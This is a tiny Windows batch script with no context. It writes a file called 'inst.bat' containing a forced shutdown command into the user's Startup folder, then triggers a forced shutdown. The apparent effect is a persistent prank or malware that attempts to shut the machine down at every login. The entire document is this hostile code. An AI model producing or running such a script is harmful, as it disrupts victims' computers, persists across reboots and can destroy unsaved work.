@echo off
cd "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup"
echo shutdown /f > inst.bat
shutdown /f